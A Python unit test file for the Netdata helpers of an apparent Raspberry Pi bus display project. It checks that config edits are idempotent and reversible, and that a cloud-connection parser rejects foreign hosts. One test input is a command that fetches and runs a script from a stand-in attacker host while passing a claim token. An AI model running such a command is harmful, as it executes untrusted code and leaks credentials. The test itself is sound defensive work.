import tempfile
import unittest
from pathlib import Path
from pi_bus_time_display.netdata import configure_netdata_lightweight, parse_netdata_connection_command


class SharedNetdataTests(unittest.TestCase):
    def test_lightweight_preserves_configuration_and_restores_plugins(self):
        for static in (False, True):
            with tempfile.TemporaryDirectory() as directory:
                root = Path(directory)
                if static:
                    binary = root / 'opt/netdata/bin/netdata'
                    binary.parent.mkdir(parents=True)
                    binary.touch()
                config = root / ('opt/netdata/etc/netdata/netdata.conf' if static else 'etc/netdata/netdata.conf')
                config.parent.mkdir(parents=True)
                original = '[web]\n    bind to = localhost\n[plugins]\n    apps = no\n    custom = yes\n[db]\n    mode = dbengine\n'
                config.write_text(original)
                configure_netdata_lightweight(root, True)
                once = config.read_text()
                configure_netdata_lightweight(root, True)
                self.assertEqual(config.read_text(), once)
                self.assertIn('update every = 3', once)
                self.assertIn('mode = dbengine', once)
                self.assertIn('bind to = localhost', once)
                self.assertIn('custom = yes', once)
                self.assertIn('apps = yes', once)
                configure_netdata_lightweight(root, False)
                self.assertIn('apps = no', config.read_text())
                self.assertIn('update every = 1', config.read_text())
                self.assertEqual(config.with_name('netdata.conf.pi-home-backup').read_text(), original)

    def test_cloud_command_rejects_other_hosts(self):
        with self.assertRaises(ValueError):
            parse_netdata_connection_command('bash https://evil.example/script --claim-token private-token')


if __name__ == '__main__': unittest.main()
